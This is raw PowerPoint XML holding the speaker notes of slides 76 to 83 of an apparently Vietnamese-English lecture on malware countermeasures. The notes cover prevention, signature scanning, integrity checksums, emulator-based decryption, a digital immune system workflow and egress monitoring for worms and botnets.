            <a:fld id="{18F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>76</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="311846690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0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>prevention: Do not allow malware to get into the system in the first place, or block the ability of it to modify the system.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>there</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>are four main elements of prevention: policy, awareness, vulnerability mitigation,</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>and threat mitigation.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>Thứ 2: For example, a scanner may look for the beginning of an encryption loop used in a</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>polymorphic virus and discover the encryption key. Once the key is discovered, the</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>scanner can decrypt the malware to identify it, then remove the infection and return</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>the program to service.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>A checksum can be appended to each program. If malware alters or replaces some program without</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>changing the checksum, then an integrity check will catch this change.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{18F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>77</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="307133973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a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>CPU emulator: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>A software-based virtual computer. Instructions in an executable file are interpreted by the emulator rather than executed on the underlying processor. The emulator includes software versions of all registers and other processor hardware, so that the underlying processor is unaffected by programs interpreted on the emulator.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>• </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>Virus signature scanner: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>A module that scans the target code looking for known malware signatures.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>• </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>Emulation control module: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>Controls the execution of the target code.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{18F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>78</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="109242954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sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Một chương trình giám sát trên mỗi máy tính cá nhân </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>suy </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ra có một </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>virus</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> xuất hiện và chuyển tiếp một bản sao tới một máy tính </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>admin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200">
              <a:solidFill>
                <a:schemeClr val="accent2"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="just"/>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>2. Máy admin sẽ mã hóavà gửi đến máy phân tích virus trung tâm.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200">
              <a:solidFill>
                <a:schemeClr val="accent2"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="just"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>. Máy này tạo ra một môi trường chương trình bị nhiễm có thể chạy an toàn để phân tích</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> sau đó </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>đưa ra kết quả </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>để xác định và loại bỏ các vi rút</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just"/>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>4. kết quả được gửi lại cho máy </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>admin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200">
              <a:solidFill>
                <a:schemeClr val="accent2"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="just"/>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>5. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Máy admin gửi nó cho tất cả client</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just"/>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>6. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Nó cũng được chuyển đến tổ chức khác</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just"/>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>7. Người đăng ký trên toàn thế giới thường xuyên nhận được các bản cập nhật chống virus để bảo vệ khỏi virus mới</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{18F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>80</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="420369462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8F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>81</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="170493170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0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>The egress monitor is designed to catch the source of a malware attack by monitoring outgoing traffic for signs of scanning or other suspicious behavior. This monitoring could look for the common sequential or random scanning behavior used by worms and rate limit or block it. It may also be able to detect and respond to abnormally high email traffic such as that use by mass-email worms, or spam payloads.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>Perimeter monitoring can also assist in detecting and responding to botnet activity by detecting abnormal traffic patterns associated with this activity. Once bots are activated and an attack is underway, such monitoring can be used to detect the attack. However, the primary objective is to try to detect and disable the botnet during its construction phase, using the various scanning techniques we have just discussed, identifying and blocking the malware that is used to propagate this type of payload.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{18F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>82</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="190179098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8F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>83</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="234758022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lgn="just">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
